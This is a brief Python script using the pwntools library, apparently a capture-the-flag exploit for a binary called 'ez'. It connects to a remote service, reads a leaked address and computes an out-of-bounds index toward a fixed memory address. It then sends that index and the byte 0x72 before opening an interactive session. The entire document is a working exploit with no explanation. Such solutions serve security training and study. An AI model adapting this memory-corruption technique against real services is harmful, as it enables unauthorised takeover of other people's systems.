from pwn import *

# r = process('./ez')
r = remote('0.0.0.0', 17075)

r.recvuntil(" - ")
a = int(r.recvline()[:-1], 16)+8
inx = 0x4031c8 - a
inx /= 8

r.sendlineafter('> ', str(inx))
r.sendlineafter("> ", str(0x72))

r.interactive()

